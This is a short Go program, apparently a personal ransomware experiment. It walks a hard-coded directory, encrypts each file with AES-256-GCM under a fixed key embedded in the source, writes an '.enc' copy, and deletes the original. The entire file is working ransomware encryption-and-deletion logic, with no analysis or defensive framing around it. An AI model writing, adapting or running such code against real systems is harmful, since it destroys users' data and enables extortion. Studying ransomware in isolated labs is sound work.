package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

func main() {

	//Initialize AES in GCM Mode
	key := []byte("thisisthesecretkeythatwillbeused") //32 bytes key for AES-256
	if len(key) != 32 {
		panic("key length must be 32 bytes for AES-256")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		panic("error while setting up aes : " + err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic("error while setting up gcm : " + err.Error())
	}

	//Check current working directory
	cwd, err := os.Getwd()
	if err != nil {
		panic("error getting current dirrectory : " + err.Error())
	}
	fmt.Println("Current working directory: ", cwd)

	//define the directory path
	dirPath := "C:\\Users\\hieng\\Desktop\\Ransomware\\Experiment"

	//Ensure the directory exists
	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
		panic("directory does not exist: " + dirPath)
	}

	//Looping Through Target File
	err = filepath.WalkDir(dirPath, func(path string, info os.DirEntry, err error) error {
		if err != nil {
			return err
		}

		//Skip if directory
		if !info.IsDir() {
			fmt.Println("Encrypting " + path + "...")

			//Read file content
			original, err := os.ReadFile(path)
			if err != nil {
				fmt.Println("error while reading file contents: ", err)
				return err
			}

			//Encrypt Bytes
			nonce := make([]byte, gcm.NonceSize())
			if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
				fmt.Println("error while generating nonce: ", err)
				return err
			}
			encrypted := gcm.Seal(nonce, nonce, original, nil)

			//Write Encrypted contents
			encFilePath := path + ".enc"
			if err := os.WriteFile(encFilePath, encrypted, 0666); err != nil {
				fmt.Println("error while writing encrypted contents: ", err)
				return err
			}

			//Delete the original file
			if err := os.Remove(path); err != nil {
				fmt.Println("error while deleting the original file: ", err)
				return err
			}
		}
		return nil
	})
	if err != nil {
		fmt.Println("error walking the path: ", err)
	}
}
